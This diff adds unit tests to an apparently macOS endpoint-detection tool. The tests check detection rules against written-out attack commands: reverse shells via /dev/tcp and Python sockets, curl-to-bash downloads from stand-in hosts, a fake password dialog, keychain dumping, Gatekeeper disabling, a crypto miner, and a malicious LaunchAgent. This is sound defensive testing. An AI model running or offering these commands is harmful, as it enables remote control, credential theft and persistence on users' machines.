@@ -187,4 +187,101 @@ final class BastionTests: XCTestCase {
         XCTAssertTrue(s.suggestionsEnabled)
         XCTAssertEqual(s.intel, IntelSettings())
     }
+
+    // MARK: EDR
+
+    private func rules(_ cmd: String) -> Set<String> { Set(Detections.commandRules.filter { $0.matches(cmd) }.map(\.id)) }
+
+    func testCommandRulesCatchAttacks() {
+        XCTAssertTrue(rules("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").contains("cmd.reverse-shell"))
+        XCTAssertTrue(rules("python3 -c import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)").contains("cmd.reverse-shell"))
+        XCTAssertTrue(rules("curl -fsSL http://evil.example/x.sh | bash").contains("cmd.download-exec"))
+        XCTAssertTrue(rules("echo ZWNobyBoaQ== | base64 -d | sh").contains("cmd.base64-exec"))
+        XCTAssertTrue(rules(#"osascript -e display dialog "macOS needs your password" default answer "" with hidden answer"#).contains("cmd.password-prompt"))
+        XCTAssertTrue(rules("security dump-keychain -d login.keychain").contains("cmd.keychain"))
+        XCTAssertTrue(rules("xattr -d com.apple.quarantine /tmp/payload").contains("cmd.quarantine-strip"))
+        XCTAssertTrue(rules("sudo spctl --master-disable").contains("cmd.defense-off"))
+        XCTAssertTrue(rules("./xmrig -o stratum+tcp://pool.example:3333 --donate-level 1").contains("cmd.miner"))
+        XCTAssertTrue(rules("launchctl load /Users/Shared/.agent.plist").contains("cmd.launch-temp"))
+        XCTAssertTrue(rules("dscl . -append /Groups/admin GroupMembership eve").contains("cmd.account"))
+    }
+
+    func testCommandRulesIgnoreEverydayCommands() {
+        for cmd in ["/bin/zsh -l", "git status", "curl -fsSL https://example.com -o file.tar.gz", "brew install ollama",
+                    "/usr/bin/security find-certificate -c Apple", "python3 manage.py runserver", "ssh user@host",
+                    "/Applications/Xcode.app/Contents/MacOS/Xcode", "ls -la /tmp", "xattr -l file.zip",
+                    "launchctl list", "base64 -i file.png -o out.txt", "screencapture -i shot.png"] {
+            XCTAssertEqual(rules(cmd), [], cmd)
+        }
+    }
+
+    private func proc(_ path: String, name: String? = nil, uid: UInt32 = 501, args: [String]? = nil) -> ProcInfo {
+        ProcInfo(pid: 4242, ppid: 1, uid: uid, start: Date(), name: name ?? (path as NSString).lastPathComponent, path: path, args: args)
+    }
+
+    func testProcessRules() {
+        let unsigned = CodeID(signingID: nil, teamID: nil, appleSigned: false)
+        let apple = CodeID(signingID: "com.apple.x", teamID: nil, appleSigned: true)
+        let dev = CodeID(signingID: "com.foo", teamID: "TEAM", appleSigned: false)
+        func ids(_ p: ProcInfo, _ id: CodeID, ancestors: [ProcInfo] = [], exists: Bool = true) -> Set<String> {
+            Set(Detections.evaluate(p, id: id, ancestors: ancestors, exists: exists).map(\.rule))
+        }
+        XCTAssertTrue(ids(proc("/private/tmp/.x/update"), unsigned).contains("proc.temp-exec"))
+        XCTAssertTrue(ids(proc("/Users/me/Library/.hidden/agent"), unsigned).contains("proc.hidden-exec"))
+        XCTAssertFalse(ids(proc("/Users/me/.cargo/bin/rg"), unsigned).contains("proc.hidden-exec"), "dev tool folders are fine")
+        XCTAssertFalse(ids(proc("/private/var/folders/x/T/AppTranslocation/A/d/Foo.app/Contents/MacOS/Foo"), unsigned).contains("proc.temp-exec"))
+        XCTAssertTrue(ids(proc("/Users/me/Library/mds"), dev).contains("proc.masquerade"))
+        XCTAssertFalse(ids(proc("/System/Library/Frameworks/CoreServices.framework/mds"), apple).contains("proc.masquerade"))
+        XCTAssertTrue(ids(proc("/Users/me/Downloads/xmrig"), unsigned).contains("proc.tool"))
+        XCTAssertTrue(ids(proc("/Users/me/tool", uid: 0), dev).contains("proc.root-userpath"))
+        XCTAssertTrue(ids(proc("/usr/local/bin/gone"), dev, exists: false).contains("proc.deleted"))
+        let word = proc("/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word")
+        XCTAssertTrue(ids(proc("/bin/sh"), apple, ancestors: [word]).contains("chain.document-shell"))
+        let terminal = proc("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal")
+        XCTAssertTrue(ids(proc("/bin/zsh"), apple, ancestors: [terminal]).isEmpty, "a shell from Terminal is normal")
+        XCTAssertTrue(ids(proc("/opt/homebrew/bin/ollama"), dev).isEmpty)
+    }
+
+    func testPersistenceAssessment() {
+        let m = EDRMonitor()
+        let bad = LaunchItem(plist: "/Users/me/Library/LaunchAgents/com.update.plist", label: "com.update",
+                             program: "/bin/bash", arguments: ["/bin/bash", "-c", "curl -s http://x.example/p | bash"], modified: Date())
+        let rules = Set(m.assess(bad, isNew: true).map(\.draft.rule))
+        XCTAssertTrue(rules.isSuperset(of: ["persist.inline-script", "persist.cmd.download-exec", "persist.new"]))
+        XCTAssertEqual(m.assess(bad, isNew: true).first { $0.draft.rule == "persist.new" }?.draft.severity, .high)
+        let ok = LaunchItem(plist: "/Library/LaunchAgents/com.google.keystone.agent.plist", label: "com.google.keystone.agent",
+                            program: "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent",
+                            arguments: [], modified: Date())
+        XCTAssertTrue(m.assess(ok, isNew: false).isEmpty)
+    }
+
+    func testProcessTableReadsOwnArguments() {
+        let me = ProcessTable.snapshot(withArgs: true).first { $0.pid == getpid() }
+        XCTAssertNotNil(me)
+        XCTAssertFalse(me?.args?.isEmpty ?? true)
+        XCTAssertEqual(me?.path, ProcessTable.path(getpid()))
+    }
+
+    func testStableHashIsStable() {
+        XCTAssertEqual(Detections.stableHash("abc"), "ba7816bf8f01")
+    }
+
+    func testTriageNeverRecommendsDeletingSystemFiles() {
+        let f = Finding(key: "k", rule: "cmd.base64-exec", title: "Decoded payload executed", detail: "", severity: .high,
+                        category: .commandLine, mitre: [], path: "/bin/bash")
+        let safe = TriageLLM.safeRecommendation("Kill the process and delete /bin/bash", finding: f)
+        XCTAssertFalse(safe.contains("delete /bin"))
+        var temp = f
+        temp.path = "/private/tmp/updater"; temp.category = .process
+        XCTAssertEqual(TriageLLM.safeRecommendation("Kill the process and delete /private/tmp/updater", finding: temp),
+                       "Kill the process and delete /private/tmp/updater")
+        XCTAssertEqual(TriageLLM.firstSentences("One. Two. Three. Four.", 2), "One. Two.")
+    }
+
+    func testSystemStagedXPCServicesAreNotFlagged() {
+        let p = proc("/private/var/db/com.apple.xpc.roleaccountd.staging/exec/1.2.xpc/Contents/MacOS/com.apple.dt.instruments.dtsecurity",
+                     name: "com.apple.dt.instruments.dtsecurity", uid: 0)
+        let unreadable = CodeID(signingID: nil, teamID: nil, appleSigned: false)
+        XCTAssertTrue(Detections.evaluate(p, id: unreadable, ancestors: [], exists: false).isEmpty)
+    }
 }
